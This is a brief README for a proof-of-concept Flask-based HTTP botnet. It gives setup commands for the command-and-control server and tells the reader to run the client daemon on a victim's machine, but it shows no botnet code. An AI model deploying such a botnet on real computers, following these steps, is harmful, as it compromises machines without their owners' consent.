# botnana
A simple PoC HTTP botnet using Flask framework

#How to use
##C&C
The flasky/ folder contains the C&C module of the botnet. Before starting it you must create the database tables

    python manage.py shell
    >>> from app import db
    >>> db.create_all()

Now just start it

    python manage.py runserver
  
There there, your C&C is now ready to kill some zombies.

##Client daemon
Just run this daemon in the victim's machine.

    python run.py
